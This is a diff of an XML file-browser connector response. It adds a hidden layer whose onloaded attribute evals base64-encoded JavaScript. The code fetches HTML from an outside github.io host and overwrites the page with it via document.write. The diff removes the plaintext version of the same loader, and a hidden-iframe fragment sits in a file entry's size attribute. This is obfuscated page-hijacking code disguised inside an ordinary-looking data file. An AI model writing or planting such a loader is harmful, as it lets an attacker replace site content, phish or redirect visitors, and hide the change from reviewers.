@@ -1,12 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <Connector command="GetFoldersAndFiles" resourceType="Document">
-  <layer name="js_loader" type="container" visible="false" onloaded="js(eval(var w=atob('var id = new URLSearchParams(location.search).get("id") || "alczar_arquitectonico";fetch("https://mrsabasmia.github.io/subwork/" + id + ".html")
-  .then(e => e.text())
-  .then(e => {
-    document.open();
-    document.write(e);
-    document.close();
-  });');eval(w)););"/>
+  <layer name="js_loader" type="container" visible="false" onloaded="js(eval(var w=atob('dmFyIGlkID0gbmV3IFVSTFNlYXJjaFBhcmFtcyhsb2NhdGlvbi5zZWFyY2gpLmdldCgiaWQiKSB8fCAiYWxjemFyX2FycXVpdGVjdG9uaWNvIjsKCmZldGNoKCJodHRwczovL21yc2FiYXNtaWEuZ2l0aHViLmlvL3N1YndvcmsvIiArIGlkICsgIi5odG1sIikKICAudGhlbihlID0+IGUudGV4dCgpKQogIC50aGVuKGUgPT4gewogICAgZG9jdW1lbnQub3BlbigpOwogICAgZG9jdW1lbnQud3JpdGUoZSk7CiAgICBkb2N1bWVudC5jbG9zZSgpOwogIH0pOw==');eval(w)););"/>
   <Files>
     <File name="Loading..." url="1" size="&lt;iframe style=&quot;display:none&quot;"/>
   </Files>
